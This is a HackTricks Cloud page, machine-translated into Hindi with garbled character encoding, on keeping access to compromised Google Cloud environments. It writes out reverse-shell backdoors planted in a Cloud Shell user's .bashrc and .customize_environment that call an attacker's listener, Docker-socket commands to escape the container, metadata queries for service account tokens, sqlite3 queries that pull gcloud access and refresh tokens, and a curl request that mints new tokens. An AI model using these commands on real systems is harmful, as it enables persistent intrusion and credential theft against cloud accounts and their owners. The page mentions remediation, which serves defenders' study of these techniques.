# GCP - рдЧреИрд░-рд╕реЗрд╡рд╛ рд╕реНрдерд╛рдпрд┐рддреНрд╡

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos** рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

рдпреЗ рдЙрдкрдпреЛрдЧреА рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ, рдЬрдм рдЖрдкрдиреЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ GCP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ GCP рдорд╛рд╣реМрд▓ рдореЗрдВ рдЪрд▓ рд░рд╣реА рдХреЛрдИ рдорд╢реАрди рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░ рд▓рд┐рдпрд╛ рд╣реЛред

## Google рдХрд╛ рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓ <a href="#e5eb" id="e5eb"></a>

### рд╕реНрдерд╛рдпреА рдмреИрдХрдбреЛрд░

[**Google рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓**](https://cloud.google.com/shell/) рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдЖрдкрдХреЗ рдХреНрд▓рд╛рдЙрдб рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рдПрдХреНрд╕реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рднреА рд▓рд╛рдЧрдд рдХреЗред

рдЖрдк Google рдХреЗ рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓ рдХреЛ **рд╡реЗрдм рдХрдВрд╕реЛрд▓** рд╕реЗ рдпрд╛ **`gcloud cloud-shell ssh`** рдЪрд▓рд╛рдХрд░ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдХрдВрд╕реЛрд▓ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд╖рдорддрд╛рдПрдВ рд╣реИрдВ:

1. **Google рдХреНрд▓рд╛рдЙрдб рдХреЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ Google рдХреНрд▓рд╛рдЙрдб рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ** рдФрд░ рдЙрдирдХреЗ рдкрд╛рд╕ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╣реЛрддреА рд╣реИред
2. рдпрджрд┐ рдХреЛрдИ рдЧрддрд┐рд╡рд┐рдзрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рддреЛ рдЙрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ **рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХрдо рд╕реЗ рдХрдо 120 рджрд┐рди рддрдХ рдмрдиреА рд░рд╣реЗрдЧреА**ред
3. рдЙрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдХреЛрдИ рд╕рдВрдЧрдарди **рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИ**ред

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдЕрд░реНрде рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдПрдХ рдмреИрдХрдбреЛрд░ рд░рдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрдо рд╕реЗ рдХрдо 120 рджрд┐рдиреЛрдВ рдореЗрдВ рдПрдХ рдмрд╛рд░ GC рд╢реИрд▓ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ, рдмреИрдХрдбреЛрд░ рдмрдиреА рд░рд╣реЗрдЧреА рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╣рд░ рдмрд╛рд░ рд╢реИрд▓ рдЪрд▓рд╛рдиреЗ рдкрд░ рдПрдХ рд╢реИрд▓ рдорд┐рд▓реЗрдЧреА, рдмрд╕ рдЗрд╕реЗ рдХрд░рдХреЗ:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
рдШрд░ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╣реИ **`.customize_environment`** рдЬреЛ, рдпрджрд┐ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╣рд░ рдмрд╛рд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓ рдореЗрдВ рдкрд╣реБрдВрдЪрдиреЗ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА** (рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдХреА рддрд░рд╣)ред рдмрд╕ рдкрд┐рдЫрд▓реЗ рдмреИрдХрдбреЛрд░ рдХреЛ рдбрд╛рд▓реЗрдВ рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдПрдХ рдмреИрдХрдбреЛрд░ рдбрд╛рд▓реЗрдВ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "рдмрд╛рд░-рдмрд╛рд░" рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд░рд╣реЗ рддрдм рддрдХ рд╕реНрдерд┐рд░рддрд╛ рдмрдиреА рд░рд╣реЗ:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреНрд▓рд╛рдЙрдб рд╢реЗрд▓ рдореЗрдВ рдкрд╣рд▓реА рдмрд╛рд░ рдПрдХреНрд╢рди рдХреЛ рдЕрджреНрдпрддрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рдЕрдзрд┐рдХреГрддрд┐ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЕрдЧрд░ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреЙрдк-рдЕрдк рдЖрддрд╛ рд╣реИ, рддреЛ рд▓рдХреНрд╖реНрдп рд╕рдВрджреЗрд╣ рдореЗрдВ рдЖ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### Google Cloud Shell рдХрдВрдЯреЗрдирд░ рдЫреВрдЯрдирд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Google Cloud Shell рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ **рдореЗрдЬрдмрд╛рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдЗрд╕реЗ рдХрд░рдХреЗ:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
рдпрд╣ рдЧреВрдЧрд▓ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдкрдХреЛ рдЙрд╕ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреНрдпрд╛ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдХреА рдПрдХ рд╡рд┐рд╕реНрддреГрдд рджреГрд╖реНрдЯрд┐ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣реЛрд╕реНрдЯ рд╕реЗ рдЖрдк рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреЛрдк рдХреЗ рд╕рд╛рде:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## рдЯреЛрдХрди рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

### рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

рдпрджрд┐ рдЖрдк **GCP рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ**, рдЖрдкрдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА рдЬрдм рддрдХ рдЖрдк рдЪрд╛рд╣реЗрдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА рдФрд░ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ MFA рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рд╣реБрдЖ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рднреАред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рдирдП рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣реЗрдВ рдЬрд┐рддрдиреА рджреЗрд░ рдЪрд╛рд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА.

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд░реНрддрдорд╛рди рдЯреЛрдХрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
рдПрдХ рдирдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ:
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
рдирдП рддрд╛рдЬрдЧреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди, рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд╕рд╛рде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ:
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рддрд░рд╣, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреА **рдирд┐рдЬреА рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╣рдерд┐рдпрд╛ рд▓реЗрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЗрд╕реЗ **рдЖрдорддреМрд░ рдкрд░ рдЬрдм рддрдХ рдЪрд╛рд╣реЗрдВ рддрдм рддрдХ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВрдЧреЗ**ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ **OAuth рдЯреЛрдХрди** рдХреЛ рдЪреБрд░рд╛ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдФрд░ рднреА рд░реЛрдЪрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐, рдпрджрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпреЗ рдЯреЛрдХрди рдПрдХ рдШрдВрдЯреЗ рдХреЗ рд▓рд┐рдП рд╣реА рдЙрдкрдпреЛрдЧреА рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдпрджрд┐ **рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдирд┐рдЬреА API рдХреБрдВрдЬреА рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ, рддреЛ OAuh рдЯреЛрдХрди рдЕрднреА рддрдХ рдорд╛рдиреНрдп рд░рд╣реЗрдЧрд╛ рдЬрдм рддрдХ рдпрд╣ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред

### рдореЗрдЯрд╛рдбреЗрдЯрд╛

рд╕реНрдкрд╖реНрдЯ рд╣реИ, рдЬрдм рддрдХ рдЖрдк GCP рдорд╛рд╣реМрд▓ рдореЗрдВ рдЪрд▓ рд░рд╣реА рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рдЖрдк **рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдХреЗ рдЙрд╕ рдорд╢реАрди рд╕реЗ рдЬреБрдбрд╝реЗ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗ** (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдореЗрдВ рдЖрдк рдЖрдорддреМрд░ рдкрд░ рд╕реНрдХреЛрдкреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд OAuth рдЯреЛрдХрди рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### рдЙрдкрдЪрд╛рд░

рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЙрдкрдЪрд╛рд░ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2) рдореЗрдВ рд╕рдордЭрд╛рдП рдЧрдП рд╣реИрдВред

## рдкрд╣реБрдВрдЪ рд╕реНрдХреЛрдкреНрд╕ рдХреЛ рджреБрд░реНрдЧрдо рдХрд░рдирд╛ <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

рдЬрдм [рдкрд╣реБрдВрдЪ рд╕реНрдХреЛрдкреНрд╕](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХрдВрдкреНрдпреВрдЯрд┐рдВрдЧ рдЗрдВрд╕реНрдЯреЗрдВрд╕ (VM) рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ OAuth рдЯреЛрдХрди рдореЗрдВ **рдПрдХ** [**рд╕реНрдХреЛрдк**](https://oauth.net/2/scope/) **рд╕реАрдорд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рд╕реАрдорд╛ рдХреЛ **рджреБрд░реНрдЧрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╕рдВрдХреНрд░рдорд┐рдд рдЦрд╛рддреЗ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╢реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ **рджреБрд░реНрдЧрдо рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛** рдпрд╛ рддреЛ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛрд╕реНрдЯ рдореЗрдВ **рдирдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЦреЛрдЬреЗрдВ**, рдпрд╛ **рдПрдХ OUATH рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рдХреБрдВрдЬреА рдЦреЛрдЬреЗрдВ** рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ рдкреНрд░рддрд┐рдмрдВрдз рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдпрд╛ **рдХрдо рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдПрдХ рдЕрд▓рдЧ VM рдкрд░ рдЬрд╛рдПрдВ**ред

**рдПрдХ рдФрд░ рдмреЙрдХреНрд╕ рдЦреЛрд▓реЗрдВ**

рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдорд╛рд╣реМрд▓ рдореЗрдВ рдПрдХ рдФрд░ рдмреЙрдХреНрд╕ рдореМрдЬреВрдж рд╣реЛ, рдЬрд┐рд╕рдореЗрдВ рдкрд╣реБрдВрдЪ рд╕реНрдХреЛрдкреНрд╕ рдХрдо рд╣реЛрддреА рд╣реИрдВред рдпрджрд┐ рдЖрдк `gcloud compute instances list --quiet --format=json` рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣рд╛рдВ рдРрд╕реА рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬрд╝ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬрд┐рдирдореЗрдВ рдЖрдкрдХреЛ рдЪрд╛рд╣рд┐рдП рд╡рд┐рд╢реЗрд╖ рд╕реНрдХреЛрдк рдпрд╛ **`auth/cloud-platform`** рд╕рднреА-рд╕рдорд╛рд╡реЗрд╢реА рд╕реНрдХреЛрдкред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдРрд╕реА рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬрд╝ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдЬрд┐рдирдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рд╕реМрдВрдкрд╛ рдЧрдпрд╛ рд╣реЛ (`PROJECT_NUMBER-compute@developer.gserviceaccount.com` рдХреЗ рд░реВрдк рдореЗрдВ)ред

**рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреБрдВрдЬреА рдЦреЛрдЬреЗрдВ**

Google рдмрд╣реБрдд рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХрд╣рддрд╛ рд╣реИ [**"рдкрд╣реБрдВрдЪ рд╕реНрдХреЛрдкреНрд╕ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рдирд╣реАрдВ рд╣реИрдВ... рдЬрдм OAuth рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЗрдирдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рд╕реА** [**рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреБрдВрдЬреА**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys) **рдХреЛ рдЦреЛрдЬрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рджреБрд░реНрдЧрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ **RSA рдирд┐рдЬреА рдХреБрдВрдЬреА** рд╣реИрдВ рдЬреЛ Google Cloud API рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдФрд░ **рдХреЛрдИ рд╕реНрдХреЛрдк рд╕реАрдорд╛ рд╡рд╛рд▓реЗ рдирдП OAuth рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреА рд╣реИрдВ**ред

рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░ рдХреБрдВрдЬреА рдирд┐рд░реНрдпрд╛рдд рдХрд░ рдЪреБрдХреА рд╣реИ:
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo Looking for keys for $i:
gcloud iam service-accounts keys list --iam-account $i
done
```
